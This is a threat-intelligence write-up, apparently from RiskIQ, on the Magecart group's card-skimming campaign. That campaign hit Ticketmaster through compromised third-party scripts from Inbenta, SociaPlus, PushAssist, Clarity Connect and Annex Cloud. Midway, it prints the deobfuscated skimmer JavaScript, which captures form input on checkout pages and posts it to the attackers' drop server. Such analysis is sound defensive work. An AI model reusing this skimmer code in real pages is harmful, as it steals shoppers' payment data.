@@ -1,0 +1,136 @@
+Inside and Beyond Ticketmaster: The Many Breaches of Magecart
+On June 27th, Ticketmaster, a ticket sales and distribution company, made public they had been compromised and that hackers stole customer information. However, we discovered that this was not a one-off event as initially reported, but part of a massive digital credit card-skimming campaign by the threat group Magecart affecting over 800 e-commerce sites around the world.
+The target for Magecart actors was the payment information entered into forms on Ticketmaster’s various websites. The method was hacking third-party components shared by many of the most frequented e-commerce sites in the world.
+Card skimmers are devices criminals hide within credit card readers on ATMs, fuel pumps, and other machines people pay for with credit cards every day. These devices steal credit card data for the criminal to later collect and either use themselves or sell to other parties. Since 2016, RiskIQ has reported on the rise of card skimmers of the digital variety operated by the threat group Magecart that use scripts injected into websites to steal data that’s entered into online payment forms on e-commerce sites. Hackers placed one of these digital skimmers on Ticketmaster websites through the compromise of a third-party functionality supplier known as Inbenta.
+In this article, we’ll give our comprehensive insights into the events around the Ticketmaster breach. Magecart, the criminal group that performed this attack, are well known to us. We have had an eye on them since 2015, and their attacks have been ramping up in frequency and impact over the years. Our investigation following the Inbenta breach uncovered evidence that the Inbenta attack was not a one-off, but instead indicative of a change in strategy by Magecart from focusing on piecemeal compromises to targeting third-party providers like Inbenta to perform more widespread compromises of card data.
+There are a few points that have not been adequately highlighted in the media or directly addressed by the affected parties and therefore may not yet be public knowledge. These points are discussed and analyzed in detail below, but we wanted to state beforehand that:
+We began by digging into our crawl data for Ticketmaster UK on the domain ticketmaster.co.uk. Ticketmaster noted February through June 23rd of 2018 as the time range of the breach, but our crawl data related to Ticketmaster over this period is voluminous. To narrow down the search, we focused on Inbenta, the third party supplier who caused the breach. It turned out that Inbenta sets up subdomains for their customers, which we can find easily in RiskIQ PassiveTotal. Our query gave us the following list for Ticketmaster:
+Because Ticketmaster UK was the reporting entity, we decided to look into them first, so ticketmasteruk.inbenta.com became our target in the crawls. After some digging, we found that a few Inbenta resources are hosted directly on Ticketmaster:
+Fig-1 Inbenta resources
+The narrative provided by Ticketmaster and Inbenta mentioned only a third-party script hosted by Inbenta. However, we also found the following resource URL hosted on Inbenta infrastructure, which is also on the Ticketmaster website:
+ticketmasteruk.inbenta.com/avatar/jsonp/inbenta.js
+On a normal day, this script instantiates a special JavaScript module by calling it with an added URL parameter, and it looks like this:
+Fig-2 Inbenta script
+On June 18th, the script appeared as below. Injected content is visible above the real script, which leaves the normal functionality intact:
+Fig-3 Injected content above the real script
+Going back further, on June 12th, it seems the actors replaced the script completely. Without access to the website logs, we can’t say for sure why they would later inject the malicious script into the legitimate version, but it may have been because Inbenta was working on fixing the issue, but the Magecart actors were still adding their skimmer code to the module. Here is the script as it appeared on June 12th, with all original functionality removed:
+Fig-4 Script with original functionality removed
+Another resource on Inbenta was also compromised and also serving the Magecart skimmer:
+ticketmasteruk.inbenta.com/avatar/assets/js/inbenta.js
+From our crawl data, you can see they injected the skimmer just before the mapping file:
+Fig-5 Skimmer injected before the mapping file
+A few things we concluded on the Inbenta incident based on what we observed in our crawls:
+Although Ticketmaster has acknowledged that Inbenta was breached, which, to their knowledge, subsequently caused “breaches” of their Ticketmaster International, Ticketmaster UK, GETMEIN!, and TicketWeb websites, we at RiskIQ have discovered that this list extends to at least Ticketmaster New Zealand and Ticketmaster Ireland as well.
+Furthermore, Ticketmaster Germany, Ticketmaster Australia, and Ticketmaster International (previously mentioned in the Inbenta breach) were also compromised via another completely different third-party supplier of functionality. This supplier was also breached by the Magecart actors, and the scripts they served to customers were modified on subdomains specifically set up for Ticketmaster as a customer. The supplier’s name is SociaPlus:
+Fig-6 SociaPlus
+We observed instances in December 2017 through January 2018 where the Magecart skimmer was added to one of the SociaPlus scripts and subsequently injected into multiple Ticketmaster websites. The URLs for the modified scripts were:
+ticketmasteraus.api.sociaplus.com/partner.js
+ticketmasterde.api.sociaplus.com/partner.js
+At the very end of these scripts, the Magecart skimmer can be seen:
+Fig-7 Magecart skimmer
+Currently, those scripts seem to be clean, but we do not know if either Ticketmaster or SociaPlus are aware of this breach or if they’ve had discourse with each other about it. The C2 used for these attacks, webfotce[.]me, is the same as the one mentioned in the most recent media coverage of the attack—however, the compromise of SociaPlus we have described was not publicly known until this publication.
+The skimmer itself is quite simple, but it’s obfuscated. To analyze it, we first have to get rid of the obfuscation applied to the injected script. As a side note, the obfuscation comes from an online service called javascriptobfuscator.com which provides free and premium obfuscation methods. The obfuscation is, rather simple and once we decode the hex strings and tidy up the code we are left with a clean sample of a digital card skimmer. This skimmer, in particular, is familiar to us as we have been tracking it for some time. We call it Magecart:
+var skimmer = {
+    snd: null,
+    gate: ‘https://webfotce.me/js/form.js’,
+    myid: (function(cname) {
+        var cd = document.cookie.match(new RegExp(‘(?:^|; )’ + cname.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, ‘\$1’) + ‘=([^;]*)’));
+        return cd ? decodeURIComponent(cd[1]) : undefined
+    })(‘setidd’) || (function() {
+        var d = new Date();
+        var time_id = d.getTime() + ‘-‘ + Math.floor(Math.random() * (999999999 – 11111111 + 1) + 11111111);
+        var exp = new Date(new Date().getTime() + 60 * 60 * 24 * 1000);
+        document.cookie = ‘setidd=’ + time_id + ‘; path=/; expires=’ + exp.toUTCString();
+        return time_id
+    })(),
+    clk: function() {
+        skimmer.snd. = null;
+        var inp = document.querySelectorAll(‘input, select, textarea, checkbox, button’);
+        for (var i = 0; i < inp.length; i++) {
+            if (inp[i].value.length > 0) {
+                var nme = inp[i].name;
+                if (nme == ”) {
+                    nme = i
+                };
+                skimmer.snd += inp[i].name + ‘=’ + inp[i].value + ‘&’
+            }
+        }
+    },
+    send: function() {
+        try {
+            var btn = document.querySelectorAll(‘a[href*=\’javascript:void(0)\’],button, input, submit, .btn, .button’);
+            for (var i = 0; i < btn.length; i++) {
+                var b = btn[i];
+                if (b.type != ‘text’ && b.type != ‘select’ && b.type != ‘checkbox’ && b.type != ‘password’ && b.type != ‘radio’) {
+                    if (b.addEventListener) {
+                        b.addEventListener(‘click’, skimmer.clk, false)
+                    } else {
+                        b.attachEvent(‘onclick’, skimmer.clk)
+                    }
+                }
+            };
+            var frm = document.querySelectorAll(‘form’);
+            for (var i = 0; i < frm.length; i++) {
+                if (frm[i].addEventListener) {
+                    frm[i]addEventListener(‘submit’, skimmer.clk, false)
+                } else {
+                    frm[i].attachEvent(‘onsubmit’, skimmer.clk)
+                }
+            };
+            if (skimmer.snd != null) {
+                var hostname = location.hostname.split(‘.’).slice(0).join(‘_’) || ‘nodomain’;
+                var enc_info = btoa(skimmer.snd);
+                var http = new XMLHttpRequest();
+                http.open(‘POST’, skimmer.gate, true);
+                http.setRequestHeader(‘Content-type’, ‘application/x-www-form-urlencoded’);
+                http.send(‘info=’ + enc_info + ‘&hostname=ticketmUK&key=’ + skimmer.myid)
+            };
+            skimmer.snd = null;
+            enc_info = null;
+            setTimeout(function() {
+                skimmer.send()
+            }, 30)
+        } catch (e) {}
+    }
+};
+if ((new RegExp(‘order|checkout|onestep’, ‘gi’)).test(window.location)) {
+    skimmer.send()
+}
+An essential part of understanding the skimmer is the bottom-most ‘if’ statement which uses a regular expression to check the current URL the browser is visiting. The keywords used in the regex are keywords seen on e-commerce payment pages. We’ve seen Magecart use a large variety of keywords over the years they’ve been active.
+The keywords used to be specific to specific CMS pages such as Magento. However, the actors have been learning over the years and adapted the keywords to contain generic words seen on checkout pages instead of specific CMS pages, which allows them to target generic e-commerce sites instead of specific platforms. For example, another keyword we observed on other skimmers during this Ticketmaster attack is the word ‘booking,’ which they added most likely as one ‘books’ a ticket for an event or trip.
+The skimmer is rather simple—any button or form is hooked so when a user clicks a button or submits a form the fields on the page, the skimmer extracts the name and value of the fields, combines them, and sends them to the drop server owned by the Magecart actors. Over time, these servers have had domain names mimicking JavaScript libraries or analytics services. In this case, it ‘s a typosquat on the word ‘webforce’: webfotce.me.
+What is interesting about this domain is the fact that it has been in use by the criminals since December 2016, which does not mean Ticketmaster was affected throughout this period. The Magecart drop servers are multi-use and skimmed data is tagged with the website from which it was stolen.
+We do have to mention that Monzo, a British bank, published their own transparency report on the incident noting they had customers performing payments starting in December 2017 who began experiencing fraud in April 2018. There is a turn-over time from when the Magecart actors receive the skimmed data and start using it themselves for their reshipping scheme or sell it off and other criminals begin using it. The time it takes to begin using the stolen data could explain the delay between the fraudulent usage of Monzo cards and their compromise on Ticketmaster.
+This gap in time does, however, indicate to us that the timeline provided by Ticketmaster, February to June 23rd, is incorrect. Another issue we found with their statement is that they did not seem to have a grasp on the exposure of the skimmer code on their websites and failed to mention the following Ticketmaster websites on which we also found the skimmer:
+We are currently working to determine if even more Ticketmaster sites were affected.
+The Ticketmaster incident received quite a lot of publicity and attention, but the Magecart problem extends to e-commerce sites well beyond Ticketmaster, and we believe it’s cause for far greater concern. We’ve identified over 800 victim websites from Magecart’s main campaigns making it likely bigger than any other credit card breach to date. In the case of a single, highly-targeted campaign we dubbed SERVERSIDE, we identified nearly 100 top-tier victims, mainly online shops of some of the largest brands in the world.
+Even more disturbing, the Ticketmaster breach demonstrates that the Magecart actors are continuing to refine their techniques and get better at target selection. Previously, they compromised individual websites and added new Javascript or links to remote Javascript files, but they seem to have gotten smarter—rather than go after websites, they’ve figured out that it’s easier to compromise third-party suppliers of scripts and add their skimmer. In some cases, compromising one of these suppliers gives them nearly 10,000 victims instantly.
+Currently, the publicly reported breaches are wrongly interpreted and sometimes aren’t breaches at all. They’re all part of the operation of Magecart, a single group that many reports fail to identify, which is spreading faster and wider than ever before.
+To give you an idea of the targets the Magecart actors are after, here is another third-party supplier that is, as of this writing, affected by the Magecart skimmer. This supplier, known as PushAssist, provides analytics for websites, similar to Google Analytics. Their server has been breached and is still serving analytics with the Magecart skimmer. The service boasts having over 10 thousand websites using its analytics platform:
+Fig-8 PushAssist
+A few of the resources required for their analytics scripts to work have to be included on the customer website. They are loaded from the following URLs:
+cdn.pushassist.com/account/assets/psa-US.js
+cdn.pushassist.com/account/assets/psa-cherrybrook.js
+The script looks fine when opening it initially:
+Fig-9 Initial script
+Once you scroll all the way to the bottom of the script, the Magecart skimmer is spotted easily:
+Fig-10 Magecart skimmer appears
+This means any website performing payment processing on their website that uses PushAssist is, right now, within reach of the Magecart skimmer.
+Another example is Clarity Connect which is a marketing and web technology firm that provides a CMS for company owners to create an online presence with a website or web store:
+Fig-11 Clarity Connect
+The websites built by their CMS will pull resources from console.clarity-connect.com, which was also compromised by the Magecart actors. In fact, they left a friendly message for the administrators of Clarity Connect with their skimmer:
+Fig-12 Message left by Magecart
+It seems the Magecart actors have broad access that they aren’t afraid to use if the administrator removes their skimmer again. Clarity Connect’s customers are affected by this injected skimmer code.
+Annex Cloud is another analytics provider that is currently compromised. Their customers include a script from the Annex Cloud CDN to get functionality on their page, which loads a submodule called json3:
+Fig-12 json3 submodule
+The json3 submodule was modified by the Magecart actors to include their skimmer by breaching the Annex Cloud servers. The skimmer code was injected at the top of the module:
+Fig-13 Skimmer code on the top of the module
+The json3 module isn’t the only file the Magecart actors modified—other files have been modified signaling the actors had broader access:
+Fig-14 Other modified files
+Magecart is an active threat that operates at a scale and breadth that rivals—or possibly surpasses—the recent compromises of point-of-sale systems of retail giants such as Home Depot and Target. The Magecart actors have been active since 2015 and have never retreated from their chosen criminal activity. Instead, they have continually refined their tactics and targets to maximize the return on their efforts.
+Over time, they’ve optimized their tactics culminating in successful breaches of third-party provides such as Inbenta, SociaPlus, PushAssist, Annex Cloud, and others. We will explore these compromises in even more depth in our forthcoming report on Magecart and the past and present activities of the actors behind the digital card skimmer.
+To pivot on IOCs related to this event, visit our RiskIQ PassiveTotal Public Project here: https://community.riskiq.com/projects/29b34d00-0e49-ad5f-4886-8cd89deb9692
+While we’ve been tracking this group for over two years, the IOCs listed below are only for the Ticketmaster incident and the third-party suppliers mentioned above.
+The following is a list of URLs where we observed the Magecart skimmer code to be injected. These URLs are from various organizations and suppliers mentioned above:
+During all of the above-mentioned campaigns, the Magecart actors made use of a single C2 server. We do currently track and observe hundreds of domains outside of these campaigns:
+*RiskIQ has been in contact with Annex Cloud and they were aware of the compromise and injection on July 9th, 2018. They immediately took action to clean their code, remove the skimmer, and move their data to a more secure service. We have not seen any further indications of Magecart concerning their services.
